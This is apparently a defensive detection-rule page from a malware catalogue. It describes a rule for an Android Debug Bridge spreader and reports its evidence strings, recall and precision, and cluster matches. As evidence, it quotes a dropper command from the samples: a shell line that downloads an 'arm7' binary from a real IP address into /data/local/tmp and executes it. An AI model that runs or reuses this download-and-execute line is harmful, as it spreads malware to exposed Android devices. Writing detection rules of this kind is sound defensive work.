# cap_adb_android_spread

Rule `Linux_Capability_AdbSpread` (kind capability, confidence high). MITRE ATT&CK T1021,T1105.

## What it detects
adb scanner/payload ('[adb] payload fired'), /data/local/tmp dropper lines.

## Evidence
- `string` "[adb] payload fired at %s\n" (10 files)
- `string` "%s|adb|shell|shell" (10 files)
- `string` "sh -c \"cd /data/local/tmp; wget http://37.48.254.120/arm7 -O arm7; chmod +x arm7; ./arm7; " (1 files)
- `xor22` "FCVC\rNMACN\"" (47 files) - xor22 'data/local'

Catalogue holders: 11. Spread in the catalogue: {"MD5MD5": 9, "": 1, "MD5MD5.elf": 1}. Spread of the rule: od_ kit (10) and one unnamed sample.

## Rule
Android Debug Bridge spreader: '[adb] payload fired at' with the '%s|adb|shell|shell' record, or the /data/local/tmp wget dropper line. Targets are the capability's holder files (not one variant); negatives are every other classified file. Architecture: arch-independent (strings).

## Measured
- vs catalogue holders: tp 11, fn 0 (recall 1.0).
- hits outside the holder list: 0 (none). Judged by tp+fp truth with the raw byte scan: the string index undercounts holders (merged adjacent strings, UPX copies), so hits in sibling families that carry the same bytes are real holders, not false positives. Catalogue-only precision: 1.0.

## Cluster landing (POST /api/yara/hitmap)
- cluster 1073886103 `adb_infect` (8 members), 8 hit files, ARM, MIPS, via $a1, $a2
- cluster 1073837881 `adb_infect` (2 members), 2 hit files, AARCH64, via $a1, $a2

Implemented in: adb_infect 1073886103 (ARM, MIPS) and 1073837881 (AARCH64).

## Gaps
The xor22 'data/local' string is in 47 files and is deliberately not an anchor.
